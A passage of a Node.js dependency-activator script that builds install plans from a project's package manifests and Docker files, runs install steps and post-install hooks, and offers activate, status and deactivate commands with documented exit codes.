      const packages = Object.entries(deps).map(([name, ver]) => `${name}@${ver}`);
      if (packages.length > 0) {
        // No `cwd`: the store is the only destination. The manager field is
        // vestigial for local installs (deps-home always uses `bun add --cwd
        // <store>`, the one primitive that merges instead of pruning) and is
        // kept only so `status` output still names what the squad declared.
        synth.node = { manager: pkg.packageManager?.startsWith('pnpm') ? 'pnpm' : 'npm', packages };
        synth._sources.push('package.json');
      }
    } catch (e) { /* malformed package.json — skip */ }
  }

  // pyproject.toml → python.packages (project.dependencies array)
  const pyprojectPath = path.join(squadDir, 'pyproject.toml');
  if (fs.existsSync(pyprojectPath)) {
    try {
      const raw = fs.readFileSync(pyprojectPath, 'utf8');
      // Minimal toml extraction: we just look for `dependencies = [...]` under [project]
      const m = raw.match(/\[project\][\s\S]*?dependencies\s*=\s*\[([\s\S]*?)\]/);
      if (m) {
        const packages = m[1].split(/,\s*/)
          .map(s => s.replace(/^[\s"']+|[\s"']+$/g, ''))
          .filter(s => s.length > 0 && !s.startsWith('#'));
        if (packages.length > 0) {
          // No target_dir: pip/uv install into the shared Python home.
          synth.python = { manager: 'uv', packages };
          synth._sources.push('pyproject.toml');
        }
      }
    } catch (e) { /* skip */ }
  }

  // requirements.txt → python.packages (line-delimited, ignore comments)
  const reqPath = path.join(squadDir, 'requirements.txt');
  if (fs.existsSync(reqPath) && !synth.python) {
    try {
      const packages = fs.readFileSync(reqPath, 'utf8')
        .split('\n')
        .map(l => l.replace(/#.*$/, '').trim())
        .filter(l => l.length > 0);
      if (packages.length > 0) {
        synth.python = { manager: 'pip', packages };
        synth._sources.push('requirements.txt');
      }
    } catch (e) { /* skip */ }
  }

  // Dockerfile / docker-compose → confirmation_required marker
  const dockerfile = path.join(squadDir, 'Dockerfile');
  const compose = ['docker-compose.yaml', 'docker-compose.yml', 'compose.yaml']
    .map(n => path.join(squadDir, n)).find(p => fs.existsSync(p));
  if (compose) {
    synth.services = synth.services || [];
    synth.services.push({
      name: 'docker-compose-stack',
      install_cmd: `cd ${squadDir} && docker compose pull`,
      start_cmd: `cd ${squadDir} && docker compose up -d`,
      health_check: `cd ${squadDir} && docker compose ps`,
      _confirmation_required: true,
    });
    synth._sources.push(path.basename(compose));
  } else if (fs.existsSync(dockerfile)) {
    synth._sources.push('Dockerfile');
    // We don't auto-build — just flag as note
    synth._dockerfile_present = true;
  }

  if (synth._sources.length === 0) return null;

  // Cache for user inspection
  const stateDir = path.join(STATE_DIR, slug);
  ensureDir(stateDir);
  const cachePath = path.join(stateDir, 'synth-deps.yaml');
  if (YAML) {
    try { fs.writeFileSync(cachePath, YAML.stringify(synth, { lineWidth: 0 }), 'utf8'); } catch { /* skip cache */ }
  }
  synth._cached_at = cachePath;
  return synth;
}

function activate(slug, opts = {}) {
  const squadDir = RESOLVED_SQUAD_PATH || path.join(SQUADS_DIR, slug);
  const depsPath = path.join(squadDir, 'dependencies.yaml');

  if (!fs.existsSync(squadDir)) {
    return { ok: false, slug, error: `squad not found: ${squadDir}` };
  }

  let deps = readYaml(depsPath);
  let synthesized = false;
  if (!deps) {
    deps = _synthesizeFromManifests(squadDir, slug);
    synthesized = !!deps;
  }
  if (!deps) {
    const result = {
      ok: true, slug,
      status: 'no_dependencies_declared',
      message: `No dependencies.yaml at ${depsPath} and no package.json / pyproject.toml / requirements.txt to synthesize from. Squad assumed self-contained.`,
      squad_dir: squadDir,
      activated_at: new Date().toISOString(),
    };
    // Persist state so callers (glance, `status`, audits) see this squad as
    // activated even though there were no deps to install.
    try {
      const stateDir = path.join(STATE_DIR, slug);
      ensureDir(stateDir);
      fs.writeFileSync(path.join(stateDir, 'activated.json'), JSON.stringify(result, null, 2), 'utf8');
    } catch { /* state persist best-effort */ }
    return result;
  }

  const dryRun = !!opts.dryRun;
  const confirmHeavyDownloads = !!opts.confirmHeavyDownloads;

  const log = {
    slug,
    started_at: new Date().toISOString(),
    dry_run: dryRun,
    platform: PLATFORM,
    schema_version: deps.schema_version || '1.0',
    synthesized,
    synth_sources: deps._sources || null,
    synth_cached_at: deps._cached_at || null,
    steps: {},
  };

  // System tools
  if (Array.isArray(deps.system)) {
    log.steps.system = deps.system.map(d => installSystem(d, dryRun, opts.confirmHeavyDownloads));
  }

  // Python deps
  if (deps.python) {
    log.steps.python = installPython(deps.python, dryRun);
  }

  // Node deps
  if (deps.node) {
    log.steps.node = installNode(deps.node, dryRun, squadDir);
  }

  // Sub-app deps (dashboard/, scripts/, … with their own package.json) — a squad
  // is only "ready" if its sub-projects can run too, not just the root.
  const subapps = installSubApps(squadDir, dryRun);
  if (subapps.length) log.steps.subapps = subapps;

  // Services (Pixelle, ComfyUI, Ollama, etc.)
  if (Array.isArray(deps.services)) {
    log.steps.services = deps.services.map(s => installService(s, dryRun));
  }

  // ComfyUI custom nodes
  if (deps.custom_nodes) {
    log.steps.custom_nodes = installCustomNodes(deps.custom_nodes, dryRun);
  }

  // Model downloads (HuggingFace etc.)
  if (deps.models) {
    log.steps.models = installModels(deps.models, dryRun, { confirmHeavyDownloads });
  }

  // Env vars (check only — never write)
  if (deps.env_vars) {
    log.steps.env_vars = checkEnvVars(deps.env_vars);
  }

  // Post-install hooks
  if (deps.post_install) {
    log.steps.post_install = runPostInstall(deps.post_install, dryRun);
  }

  // Roll-up
  const failures = [];
  const confirmations = [];
  const warnings = [];
  for (const stepName of Object.keys(log.steps)) {
    const step = log.steps[stepName];
    const items = Array.isArray(step) ? step : (step.items || [step]);
    for (const item of items) {
      if (!item || !item.status) continue;
      if (/_failed$/.test(item.status)) failures.push({ step: stepName, ...item });
      else if (item.status === 'confirmation_required') confirmations.push({ step: stepName, ...item });
      // Missing API keys / system prereqs do NOT block activation — the squad
      // installs its code deps and runs in degraded mode until the user supplies
      // them. Surfaced as warnings so the caller can prompt the user.
      else if (item.status === 'missing_required' || item.status === 'missing_system_tool') warnings.push({ step: stepName, ...item });
    }
  }

  log.ok = failures.length === 0 && confirmations.length === 0;
  log.failures = failures;
  log.confirmations_required = confirmations;
  log.warnings = warnings;
  log.completed_at = new Date().toISOString();

  if (!dryRun && log.ok) {
    saveState(slug, {
      slug,
      activated_at: log.completed_at,
      deps_hash: JSON.stringify(deps).length,  // simple change-detection
      schema_version: log.schema_version,
    });
  }

  return log;
}

function status(slug) {
  const state = loadState(slug);
  const depsPath = path.join(RESOLVED_SQUAD_PATH || path.join(SQUADS_DIR, slug), 'dependencies.yaml');
  const hasDeps = fs.existsSync(depsPath);
  return {
    slug,
    has_dependencies_yaml: hasDeps,
    activated: !!state,
    state: state || null,
  };
}

function deactivate(slug) {
  const p = getStatePath(slug);
  if (fs.existsSync(p)) fs.unlinkSync(p);
  return { ok: true, slug, deactivated_at: new Date().toISOString() };
}

// windowsCmdMetachar is exported for its own test: it is the whole Windows
// decision, and the spawn it guards cannot be exercised from a POSIX runner.
module.exports = { activate, status, deactivate, _windowsShellPlan: windowsShellPlan, _fetchAndExecute: fetchAndExecute };

// CLI — exit codes follow the contract documented in scripts/activate-squad.sh:
//   0 = ok / activated
//   1 = failures present (one or more steps reported _failed)
//   2 = confirmations required (heavy downloads / sudo)
//   4 = invalid args / squad not found
if (require.main === module) {
  const cmd = process.argv[2];
  const slug = process.argv[3];
  const flags = process.argv.slice(4);
  const opts = {
    dryRun: flags.includes('--dry-run'),
    confirmHeavyDownloads: flags.includes('--confirm-heavy'),
    verbose: flags.includes('--verbose') || flags.includes('-v'),
  };

  if (cmd === 'activate' && slug) {
    // --verbose hint propagates to install helpers via env so they keep stdio: 'inherit'
    if (opts.verbose) process.env.MAESTRO_ACTIVATOR_VERBOSE = '1';

    const result = activate(slug, opts);
    console.log(JSON.stringify(result, null, 2));

    // Exit-code contract
    if (result.ok === false && result.error) {
      // Squad not found etc.
      process.exit(4);
    }
    const failures = (result.failures || []).length;
    const confirmations = (result.confirmations_required || []).length;
    if (failures > 0) process.exit(1);
    if (confirmations > 0) process.exit(2);
    process.exit(0);
  }

  if (cmd === 'status' && slug) {
    console.log(JSON.stringify(status(slug), null, 2));
    process.exit(0);
  }

  if (cmd === 'deactivate' && slug) {
    console.log(JSON.stringify(deactivate(slug), null, 2));
    process.exit(0);
  }

  console.error('usage: activator.js {activate|status|deactivate} <slug> [--dry-run] [--confirm-heavy] [--verbose|-v]');
  process.exit(4);
}
